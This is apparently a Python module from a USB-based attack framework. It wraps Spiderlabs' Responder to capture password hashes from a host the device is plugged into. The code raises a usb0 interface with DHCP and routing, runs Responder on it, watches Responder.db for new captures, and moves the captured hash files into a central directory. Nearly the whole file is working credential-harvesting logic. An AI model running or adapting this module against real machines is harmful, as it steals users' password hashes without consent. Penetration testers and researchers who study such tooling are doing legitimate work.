import os
import subprocess
import time

from components.framework.Debug import Debug
from components.framework.network import FwComponentNetwork
from components.helpers.ModuleManager import ModuleManager


# TODO: FIX FILE PATHS FOR SUB-PROCESSES


class Responder(Debug):
    """ Class for Responder Module

                Args:

               functions:
                   capture              Run Spiderlabs' Responder on usb0 so password hashes can potentially
                                        be obtained.

                   network.up           Calls a method from the framework component "network.py" that enables usb0,
                                        configures the DHCP server and IP routing for network traffic
                                        capture.

                   monitor_responder    Monitors "Responder.db" for file changes and returns when either the "time
                                        to live" period has been reached or a password hash has been captured.

                   process.kill         Kills the instance of Responder that has been running.

                   network.down         Calls a method from the framework component "network.py" that disables usb0,
                                        the DHCP server and removes IP routing for the interface.

               Returns:
                   boolean

               Raises:

           """

    # Constructor
    def __init__(self, path, debug=False):
        super().__init__(debug=debug)
        self._type = "Module"
        self._name = "Responder"
        if "aspian" in subprocess.run("lsb_release -a", stdout=subprocess.PIPE, shell=True).stdout.decode():
            subprocess.run("mkdir -p ../hashes", shell=True)  # If the "hashes" directory doesn't exist, create it

        # Setup module manager
        self.module_manager = ModuleManager(debug=debug, save_needs_confirm=True)

        # import config data for this module
        self.current_config = self.module_manager.get_module_by_name(self._name)
        if not self.current_config:
            self.debug("Error: could not import config of " + self._name)

        # All modules assumed to use it
        self.path = path

        # Should not be global
        self.network = FwComponentNetwork()

    # Method used to capture password hashes from target using Spiderlabs' Responder
    def run(self):

        time_to_live = self.current_config.options["time_to_live"]  # Grab Responder's "time to live" from the .ini

        def monitor_responder():

            ##########################################################################################
            # This method uses code adapted from the Pi-Key project's 'picracking.py' in order to
            # monitor Responder's database for changes via file modification dates.

            # PiKey Created by Jon Aubrey (@SecurityJon) and Trevor Shingles (@_tshingles), 2017
            # This program is free software: you can redistribute it and/or modify it under
            # the terms of the GNU General Public License as published by the Free Software Foundation,
            # either version 3 of the License, or (at your option) any later version.
            # This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
            # without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
            # See the GNU General Public License for more details.

            # https://github.com/SecurityJon/PiKey
            # https://github.com/SecurityJon/PiKey/blob/master/client/picracking.py
            ##########################################################################################

            # Determine the last modified time of Responder.db
            timestamp_old = os.stat("../components/modules/Responder/src/Responder.db").st_mtime
            time_to_run = time.time() + time_to_live  # Set Responder "time to live"

            while time.time() < time_to_run:  # While running time < "time to live"
                timestamp_new = os.stat("../components/modules/Responder/src/Responder.db").st_mtime
                if timestamp_new > timestamp_old:  # if newer modification time is detected, sleep and return
                    time.sleep(2)
                    return True

            return False

            # ~end of Pi-Key derived code~

        self.network.up()  # Up usb0
        process = subprocess.Popen("exec python ../components/modules/Responder/src/Responder.py -I usb0 "
                                   "-f - w - r - d - F", shell=True)  # Run Responder on usb0

        hash_success = monitor_responder()  # Call the method that will determine if hashes have been captured
        process.kill()  # Kill Responder
        self.network.down()  # Down usb0

        # Move txt files that contain the hashes to a more central directory (hashes directory) if hashes were captured
        if hash_success:
            subprocess.run("find ../components/modules/Responder/src/logs -name '*.txt' -exec mv {} "
                           "../hashes \;", shell=True)

        return True


